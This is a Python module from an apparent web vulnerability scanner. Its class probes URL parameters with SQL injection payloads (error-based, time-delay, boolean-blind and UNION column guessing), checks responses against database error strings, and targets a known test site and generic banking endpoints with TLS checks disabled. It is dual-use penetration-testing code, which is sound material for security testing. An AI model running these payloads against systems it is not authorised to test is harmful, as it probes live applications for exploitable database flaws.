import urllib.request
import urllib.parse
import urllib.error
import ssl
import time
import re

SSL_CTX = ssl.create_default_context()
SSL_CTX.check_hostname = False
SSL_CTX.verify_mode = ssl.CERT_NONE

ERROR_SIGNATURES = [
    "you have an error in your sql syntax",
    "warning: mysql", "mysql_fetch", "mysql_num_rows",
    "mysql_result", "supplied argument is not a valid mysql",
    "ora-", "oracle error", "oracle.*driver", "warning.*oci_",
    "microsoft sql", "mssql_", "unclosed quotation mark",
    "incorrect syntax near", "sqlsrv_", "[sql server]",
    "pg_query", "pg_exec", "warning.*pg_", "valid postgresql",
    "sqlite3.operationalerror", "sqlite_", "sqlite error",
    "jdbc", "odbc driver", "db2 sql", "sqlstate",
    "syntax error", "unterminated string", "operationalerror",
    "division by zero", "column count doesn", "unknown column",
    "table.*doesn.*exist", "sql command not properly ended",
]

# Payloads organisés par technique
PAYLOADS_ERROR = [
    "'", "''", "`", "\"",
    "' OR '1'='1'--",
    "' OR 1=1--",
    "\" OR \"1\"=\"1",
    "1' ORDER BY 1--",
    "1' ORDER BY 10--",
    "' UNION SELECT NULL--",
    "' UNION SELECT NULL,NULL--",
    "' UNION SELECT NULL,NULL,NULL--",
    "1 AND 1=CONVERT(int,@@version)--",
    "' AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION()))--",
    "' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT(VERSION(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
]

PAYLOADS_TIME = [
    "1' AND SLEEP(4)--",
    "1 AND SLEEP(4)--",
    "'; WAITFOR DELAY '0:0:4'--",
    "1' AND (SELECT * FROM (SELECT(SLEEP(4)))a)--",
    "1 OR SLEEP(4)--",
    "' OR SLEEP(4)='",
]

PAYLOADS_BLIND = [
    ("1' AND '1'='1", "1' AND '1'='2"),
    ("1 AND 1=1", "1 AND 1=2"),
    ("1' AND 1=1--", "1' AND 1=2--"),
]

# Chemins spécifiques à testphp.vulnweb.com + endpoints bancaires génériques
VULN_PATHS = [
    # testphp.vulnweb.com spécifique
    ("/artists.php", ["artist"]),
    ("/listproducts.php", ["cat"]),
    ("/showimage.php", ["file", "size"]),
    ("/userinfo.php", ["uname", "pass"]),
    ("/search.php", ["test"]),
    ("/guestbook.php", ["name", "comment"]),
    # Endpoints bancaires génériques
    ("/login", ["user", "pass", "username", "password"]),
    ("/search", ["q", "query", "search"]),
    ("/account", ["id", "ref", "user"]),
    ("/transaction", ["id", "account", "ref"]),
    ("/card", ["id", "number"]),
    ("/profile", ["id", "user"]),
    ("/", ["id", "cat", "page", "product"]),
]


def _fetch(url, timeout=10):
    try:
        req = urllib.request.Request(url, headers={
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
            "Accept": "text/html,application/xhtml+xml,*/*"
        })
        resp = urllib.request.urlopen(req, context=SSL_CTX, timeout=timeout)
        return resp.read(100000).decode(errors="ignore"), resp.status
    except urllib.error.HTTPError as e:
        return e.read(10000).decode(errors="ignore"), e.code
    except Exception:
        return "", 0


def _fetch_baseline(url, param, value="1"):
    return _fetch(f"{url}?{param}={value}")


class SQLiDetector:
    def __init__(self, logger):
        self.logger = logger

    def _has_error(self, body):
        body_lower = body.lower()
        for sig in ERROR_SIGNATURES:
            if sig in body_lower:
                return sig
        return None

    def _test_error_based(self, base_url, param):
        baseline_body, _ = _fetch_baseline(base_url, param)

        for payload in PAYLOADS_ERROR:
            url = f"{base_url}?{param}={urllib.parse.quote(payload)}"
            body, status = _fetch(url)
            sig = self._has_error(body)
            if sig:
                return {
                    "severity": "CRITICAL",
                    "title": f"SQL Injection (error-based): {urllib.parse.urlparse(base_url).path}?{param}",
                    "detail": f"Payload: {payload} | Erreur DB: '{sig}' | URL: {url[:150]}"
                }
        return None

    def _test_time_based(self, base_url, param):
        # Baseline timing
        t0 = time.time()
        _fetch_baseline(base_url, param)
        baseline = time.time() - t0

        for payload in PAYLOADS_TIME:
            url = f"{base_url}?{param}={urllib.parse.quote(payload)}"
            t0 = time.time()
            _fetch(url, timeout=12)
            elapsed = time.time() - t0

            if elapsed >= baseline + 3.0:
                return {
                    "severity": "HIGH",
                    "title": f"SQL Injection blind (time-based): {urllib.parse.urlparse(base_url).path}?{param}",
                    "detail": f"Délai: {elapsed:.1f}s (baseline: {baseline:.1f}s) | Payload: {payload}"
                }
        return None

    def _test_blind_boolean(self, base_url, param):
        for true_payload, false_payload in PAYLOADS_BLIND:
            body_true,  _ = _fetch(f"{base_url}?{param}={urllib.parse.quote(true_payload)}")
            body_false, _ = _fetch(f"{base_url}?{param}={urllib.parse.quote(false_payload)}")

            if body_true and body_false and len(body_true) != len(body_false):
                diff = abs(len(body_true) - len(body_false))
                if diff > 50:
                    return {
                        "severity": "HIGH",
                        "title": f"SQL Injection blind (boolean): {urllib.parse.urlparse(base_url).path}?{param}",
                        "detail": f"Réponse TRUE={len(body_true)}b / FALSE={len(body_false)}b (diff={diff}b)"
                    }
        return None

    def _test_union(self, base_url, param):
        # Deviner le nombre de colonnes
        for n in range(1, 8):
            nulls = ",".join(["NULL"] * n)
            payload = f"0 UNION SELECT {nulls}--"
            url = f"{base_url}?{param}={urllib.parse.quote(payload)}"
            body, status = _fetch(url)
            sig = self._has_error(body)
            if not sig and status == 200 and len(body) > 100:
                # Possible UNION success — chercher valeur injectée
                payload2 = f"0 UNION SELECT {','.join(['0x42414e4b53454300' if i==0 else 'NULL' for i in range(n)])}--"
                url2 = f"{base_url}?{param}={urllib.parse.quote(payload2)}"
                body2, _ = _fetch(url2)
                if "BANKSEC" in body2.upper():
                    return {
                        "severity": "CRITICAL",
                        "title": f"SQL Injection UNION ({n} colonnes): {urllib.parse.urlparse(base_url).path}?{param}",
                        "detail": f"UNION SELECT réussi avec {n} colonnes. Exfiltration de données possible."
                    }
        return None

    def run(self, host, scheme="http", port=80, paths=None):
        self.logger.section("SQL Injection Detection")
        findings = []

        base = f"{scheme}://{host}" if port in (80, 443) else f"{scheme}://{host}:{port}"

        paths_to_test = paths if paths else VULN_PATHS

        for path_entry in paths_to_test:
            if isinstance(path_entry, tuple):
                path, params = path_entry
            else:
                path, params = path_entry, ["id", "cat", "q", "search"]

            url = base + path

            # Vérifier que la page existe
            body, status = _fetch(url + "?id=1")
            if status == 0:
                continue

            self.logger.debug(f"Test SQLi: {url}")

            for param in params:
                # 1. Error-based
                result = self._test_error_based(url, param)
                if result:
                    findings.append(result)
                    self.logger.vuln(result["severity"], result["title"], result["detail"][:100])
                    continue

                # 2. Boolean blind
                result = self._test_blind_boolean(url, param)
                if result:
                    findings.append(result)
                    self.logger.vuln(result["severity"], result["title"], result["detail"])
                    continue

                # 3. UNION
                result = self._test_union(url, param)
                if result:
                    findings.append(result)
                    self.logger.vuln(result["severity"], result["title"], result["detail"])
                    continue

            if len(findings) >= 10:
                break

        # Time-based sur les paramètres les plus probables (lent, limité)
        if len(findings) < 3:
            for path_entry in paths_to_test[:5]:
                path = path_entry[0] if isinstance(path_entry, tuple) else path_entry
                params = path_entry[1] if isinstance(path_entry, tuple) else ["id"]
                url = base + path
                for param in params[:2]:
                    result = self._test_time_based(url, param)
                    if result:
                        findings.append(result)
                        self.logger.vuln(result["severity"], result["title"], result["detail"])

        if not findings:
            self.logger.success("Aucune injection SQL détectée")
        else:
            self.logger.success(f"{len(findings)} injection(s) SQL trouvée(s)")

        return findings
